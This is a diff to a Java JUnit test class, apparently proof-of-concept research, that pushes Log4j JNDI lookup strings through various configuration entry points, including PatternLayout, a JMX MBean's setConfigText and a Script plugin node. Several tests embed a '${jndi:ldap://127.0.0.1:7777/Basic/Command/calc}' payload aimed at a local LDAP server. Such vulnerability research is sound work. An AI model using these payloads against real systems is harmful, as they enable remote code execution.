@@ -1,19 +1,22 @@
 import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.core.Core;
 import org.apache.logging.log4j.core.LoggerContext;
-import org.apache.logging.log4j.core.config.AbstractConfiguration;
-import org.apache.logging.log4j.core.config.Configuration;
-import org.apache.logging.log4j.core.config.ConfigurationFactory;
-import org.apache.logging.log4j.core.config.ConfigurationSource;
+import org.apache.logging.log4j.core.config.*;
 import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilder;
 import org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;
 import org.apache.logging.log4j.core.config.builder.impl.BuiltConfiguration;
 import org.apache.logging.log4j.core.config.composite.CompositeConfiguration;
 import org.apache.logging.log4j.core.config.json.JsonConfiguration;
 import org.apache.logging.log4j.core.config.json.JsonConfigurationFactory;
+import org.apache.logging.log4j.core.config.plugins.util.PluginBuilder;
+import org.apache.logging.log4j.core.config.plugins.util.PluginManager;
+import org.apache.logging.log4j.core.config.plugins.util.PluginType;
 import org.apache.logging.log4j.core.config.yaml.YamlConfigurationFactory;
+import org.apache.logging.log4j.core.impl.MutableLogEvent;
 import org.apache.logging.log4j.core.jmx.LoggerContextAdmin;
 import org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean;
 import org.apache.logging.log4j.core.layout.PatternLayout;
+import org.apache.logging.log4j.core.script.Script;
 import org.junit.jupiter.api.Test;
 
 import java.io.ByteArrayInputStream;
@@ -47,7 +50,7 @@ public class ConfigPocTests {
     }
 
     @Test
-    public void setConfigLocationUriTest()  {
+    public void setConfigLocationUriTest() {
         URI configUri = new File("config.json").toURI();
         LoggerContext context = (LoggerContext) LogManager.getContext(false);
         context.setConfigLocation(configUri);
@@ -66,7 +69,7 @@ public class ConfigPocTests {
     }
 
     @Test
-    public void createPatternParserPatternLayoutTest(){
+    public void createPatternParserPatternLayoutTest() {
         String configText = "{"
                 + "\"Configuration\": {"
                 + "    \"injectedProperty\": \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\""
@@ -102,8 +105,7 @@ public class ConfigPocTests {
         mBean.setConfigLocationUri(newConfigUri.toString());
     }
 
-    /*
-    На первый взгляд код никогда не достигается, тк location всегда null, а значит он не может распарсить данные
+
     @Test
     public void setConfigTextLoggerContextAdminMBeanTest() throws Exception {
         LoggerContext context = new LoggerContext("testContext");
@@ -114,9 +116,9 @@ public class ConfigPocTests {
             }
         });
 
-        mBean.setConfigText("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", "UTF-8");
+        mBean.setConfigText("<Configuration keyA=\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\">\n" +
+                "</Configuration>\n", "UTF-8");
     }
-     */
 
     @Test
     public void reconfigureCompositeConfigurationTest() throws Exception {
@@ -126,4 +128,17 @@ public class ConfigPocTests {
         compositeConfig.reconfigure();
     }
 
+
+    @Test
+    public void createConfigurationDefaultConfiguration() {
+        PluginManager manager = new PluginManager(Core.CATEGORY_NAME);
+        Configuration configuration = new DefaultConfiguration();
+        manager.collectPlugins();
+        PluginType<Script> plugin = (PluginType<Script>) manager.getPluginType("Script");
+        Node nodeA = new Node(null, "root", plugin);
+        nodeA.setValue("root");
+        Node nodeB = new Node(nodeA, "child", plugin);
+        nodeB.setValue("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
+        configuration.createConfiguration(nodeB, new MutableLogEvent());
+    }
 }
